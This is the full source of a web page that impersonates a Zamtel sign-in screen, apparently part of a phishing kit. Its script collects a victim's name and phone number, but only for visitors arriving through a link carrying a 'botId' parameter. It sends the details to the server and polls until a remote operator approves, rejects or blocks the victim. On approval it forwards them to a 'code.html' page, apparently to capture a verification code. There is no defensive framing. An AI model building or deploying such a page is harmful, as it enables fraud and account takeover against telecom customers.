<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zamtel | Sign In</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  background:#f2f2f2;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* CONTAINER */
.page{
  width:100%;
  max-width:360px;
  text-align:center;
  padding:20px;
}

/* BRAND NAME */
.brand-name{
  font-size:42px;
  font-weight:600;
  color:#00843d;
  margin-bottom:12px;
}

/* Welcome */
.welcome-text{
  font-size:22px;
  color:#555;
  margin-bottom:24px;
}

/* FORM */
form{
  text-align:left;
}

/* LABEL */
label{
  display:block;
  font-size:15px;
  color:#666;
  margin-bottom:6px;
  margin-top:16px;
}

/* INPUT */
input{
  width:100%;
  padding:16px;
  border:2px solid #00843d;
  border-radius:14px;
  font-size:17px;
  color:#333;
  background:#fff;
  outline:none;
}

input:focus{
  border-color:#006b31;
}

/* BUTTON */
button{
  width:100%;
  margin-top:26px;
  padding:16px;
  font-size:18px;
  font-weight:600;
  border-radius:14px;
  border:none;
  background:#00843d;
  color:#fff;
  cursor:pointer;
}

button:disabled{
  background:#cccccc;
  cursor:not-allowed;
}

/* STATUS */
#status{
  margin-top:14px;
  font-size:14px;
  color:#00843d;
  min-height:18px;
}

/* SPINNER + VALIDATING */
#validating{
  display:none;
  margin-top:24px;
  flex-direction:column;
  align-items:center;
  gap:14px;
}

#validating.show{
  display:flex;
}

.spinner{
  width:48px;
  height:48px;
  border:5px solid #e0e0e0;
  border-top-color:#00843d;
  border-radius:50%;
  animation:spin 0.9s linear infinite;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}

.validating-text{
  font-size:16px;
  font-weight:600;
  color:#00843d;
}

.validating-sub{
  font-size:13px;
  color:#888;
}

/* HIDE FORM WHEN VALIDATING */
form.hidden{
  display:none;
}

/* FOOTER */
.footer{
  margin-top:26px;
  font-size:14px;
  color:#666;
}
</style>
</head>

<body>

<div class="page">

  <div class="brand-name">Zamtel</div>

  <div class="welcome-text">Welcome</div>

  <form id="detailsForm">

    <label for="nameInput">Full Name</label>
    <input id="nameInput" type="text" placeholder="Enter your full name" autocomplete="name">

    <label for="phoneInput">Phone Number</label>
    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="Enter your phone number" autocomplete="tel">

    <button id="submitBtn" type="submit" disabled>Continue</button>

    <div id="status"></div>

  </form>

  <div id="validating">
    <div class="spinner"></div>
    <div class="validating-text">Validating…</div>
    <div class="validating-sub">Please wait while we verify your details</div>
  </div>

  <div class="footer" id="footer">
    By continuing, you agree to the terms and conditions
  </div>

</div>

<script>
const nameInput   = document.getElementById("nameInput");
const phoneInput  = document.getElementById("phoneInput");
const submitBtn   = document.getElementById("submitBtn");
const statusEl    = document.getElementById("status");
const formEl      = document.getElementById("detailsForm");
const validatingEl = document.getElementById("validating");
const footerEl    = document.getElementById("footer");

function normalizePhone(raw){
  return raw.replace(/[^0-9]/g, "");
}

function updateButtonState(){
  const nameOk  = nameInput.value.trim().length >= 2;
  const phoneOk = normalizePhone(phoneInput.value).length >= 6;
  submitBtn.disabled = !(nameOk && phoneOk);
}

nameInput.addEventListener("input", updateButtonState);
nameInput.addEventListener("change", updateButtonState);
phoneInput.addEventListener("input", updateButtonState);
phoneInput.addEventListener("change", updateButtonState);
window.addEventListener("load", updateButtonState);

function showValidating(show){
  if (show) {
    formEl.classList.add("hidden");
    validatingEl.classList.add("show");
    footerEl.style.display = "none";
  } else {
    formEl.classList.remove("hidden");
    validatingEl.classList.remove("show");
    footerEl.style.display = "block";
  }
}

let pollTimer = null;

document.getElementById("detailsForm").addEventListener("submit", async e => {
  e.preventDefault();

  const name  = nameInput.value.trim();
  const phone = normalizePhone(phoneInput.value);

  if(!name || phone.length < 6){
    statusEl.textContent = "Please enter a valid name and phone number.";
    return;
  }

  localStorage.setItem("name", name);
  localStorage.setItem("phone", phone);

  const botId = new URLSearchParams(window.location.search).get("botId") || "";
  if (!botId) {
    statusEl.textContent = "Invalid link. Please use the link you were given.";
    return;
  }

  submitBtn.disabled = true;
  statusEl.textContent = "";
  showValidating(true);

  try {
    const resp = await fetch("/submit-details", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, phone, botId })
    });

    if (!resp.ok) throw new Error("Server error");

    const { requestId } = await resp.json();
    localStorage.setItem("detailsRequestId", requestId);

    if (pollTimer) clearInterval(pollTimer);

    pollTimer = setInterval(async () => {
      try {
        const r = await fetch(`/check-details/${requestId}`);
        const data = await r.json();

        if (data.blocked) {
          clearInterval(pollTimer);
          showValidating(false);
          statusEl.textContent = "🚫 Access denied. You have been blocked.";
          submitBtn.disabled = true;
          return;
        }

        if (data.approved === true) {
          clearInterval(pollTimer);
          window.location.href = "code.html" + (botId ? "?botId=" + botId : "");
          return;
        }

        if (data.approved === false) {
          clearInterval(pollTimer);
          showValidating(false);
          statusEl.textContent = "❌ Details rejected.";
          submitBtn.disabled = false;
          return;
        }
      } catch (err) {
        // network blip — keep polling
      }
    }, 3000);

  } catch (err) {
    showValidating(false);
    statusEl.textContent = "Failed to send. Please try again.";
    submitBtn.disabled = false;
  }
});
</script>

</body>
</html>
